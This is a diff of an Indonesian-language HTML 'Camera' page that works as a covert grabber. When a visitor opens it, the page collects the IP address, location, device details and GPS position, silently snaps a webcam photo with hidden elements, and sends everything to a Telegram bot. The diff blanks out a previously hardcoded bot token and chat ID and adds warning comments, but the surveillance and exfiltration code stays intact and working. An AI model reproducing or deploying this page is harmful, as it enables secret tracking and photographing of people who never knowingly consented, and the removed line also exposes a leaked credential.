@@ -6,74 +6,52 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Camera</title>
 
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
     body {
       background: black;
       color: lime;
       font-family: monospace;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 16px;
+      text-align: center;
+      padding: 20px;
     }
 
     #info {
-      width: 100%;
-      max-width: 700px;
-      background: #111;
-      padding: 16px;
-      border-radius: 12px;
       white-space: pre-wrap;
-      word-break: break-word;
-      overflow-wrap: break-word;
-      font-size: 14px;
-      line-height: 1.5;
-    }
-
-    @media (min-width: 768px) {
-      #info {
-        padding: 24px;
-        font-size: 15px;
-      }
-    }
-
-    @media (min-width: 1024px) {
-      #info {
-        max-width: 900px;
-        font-size: 16px;
-      }
-    }
-
-    video, canvas {
-      display: none;
+      text-align: left;
+      margin: auto;
+      max-width: 600px;
+      background: #111;
+      padding: 20px;
+      border-radius: 10px;
     }
   </style>
 </head>
 
 <body>
 
-  <!--Bebas Req Tampilan-->
+  <!-- Tampilan teks ke user -->
   <div id="info">Sabar Mankkk...</div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
+  <!-- Elemen kamera (disembunyikan) -->
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <script>
-    const botToken = '7382464193:AAEcnRCG6dx09rdB4qxrxtCj75y-IwRnFy0';
-    const chatId = '5201965087';
+    // ==============================
+    // ⚠️ BAGIAN TERKAIT PIHAK LUAR
+    // ==============================
+    const botToken = ''; // ⚠️ TOKEN BOT TELEGRAM (DIKOSONGKAN)
+    const chatId = '';   // ⚠️ ID TUJUAN CHAT TELEGRAM (DIKOSONGKAN)
+
     const infoDiv = document.getElementById('info');
 
+    // ==============================
+    // ⚠️ FUNGSI KIRIM DATA KE TELEGRAM
+    // ==============================
     function sendToTelegram(text) {
+      // ⚠️ Jika token diisi, data akan dikirim ke server Telegram
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -88,7 +66,11 @@
       .catch(e => console.error('❌ Telegram Fetch Error:', e));
     }
 
+    // ==============================
+    // ⚠️ FUNGSI KIRIM FOTO KE TELEGRAM
+    // ==============================
     function sendPhotoToTelegram(blob) {
+      // ⚠️ Mengupload hasil kamera ke Telegram
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', blob);
@@ -102,14 +84,19 @@
       .catch(e => console.error('❌ Telegram Photo Error:', e));
     }
 
+    // ==============================
+    // ⚠️ PENGAMBILAN DATA DEVICE & IP
+    // ==============================
     async function getInfo() {
       let ip = '-', city = '-', region = '-', country = '-', org = '-';
 
       try {
+        // ⚠️ Ambil IP dari layanan luar (ipify)
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         ip = ipData.ip;
 
+        // ⚠️ Ambil lokasi berdasarkan IP (ip-api)
         const locRes = await fetch(`https://ip-api.com/json/${ip}`);
         const loc = await locRes.json();
 
@@ -123,9 +110,11 @@
         console.error('❌ IP/Location Error:', err);
       }
 
+      // ⚠️ Ambil info baterai device
       const battery = await navigator.getBattery?.() || { level: 0, charging: false };
       const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
 
+      // Data lengkap yang dikumpulkan
       const text = `
 IP         : ${ip}
 Kota       : ${city}
@@ -143,14 +132,20 @@ Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
 Waktu      : ${new Date().toLocaleString()}
       `.trim();
 
+      // Tampilkan ke layar
       infoDiv.innerText = text;
 
+      // ⚠️ KIRIM DATA KE TELEGRAM (PIHAK LUAR)
       sendToTelegram(`<b>📥 Informasi Pengunjung:</b>\n<pre>${text}</pre>`);
 
+      // ==============================
+      // ⚠️ AKSES LOKASI GPS
+      // ==============================
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
             const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            // ⚠️ Kirim lokasi GPS ke Telegram
             sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
           },
           err => sendToTelegram(`📍 Lokasi GPS Ditolak`)
@@ -160,34 +155,47 @@ Waktu      : ${new Date().toLocaleString()}
       }
     }
 
+    // ==============================
+    // ⚠️ AKSES KAMERA DEVICE
+    // ==============================
     async function startCamera() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const ctx = canvas.getContext('2d');
 
       try {
+        // ⚠️ Minta akses kamera user
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
           setTimeout(() => {
+            // Ambil gambar dari kamera
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             canvas.toBlob(blob => {
+              // ⚠️ KIRIM FOTO KE TELEGRAM
               if (blob) sendPhotoToTelegram(blob);
+
+              // Matikan kamera setelah ambil gambar
               stream.getTracks().forEach(t => t.stop());
             }, 'image/jpeg');
           }, 3000);
         };
+
       } catch (e) {
         console.warn('❌ Kamera gagal:', e);
         sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
       }
     }
 
+    // ==============================
+    // JALANKAN SEMUA
+    // ==============================
     getInfo();
     startCamera();
-  </script>
 
+  </script>
 </body>
 </html>
 
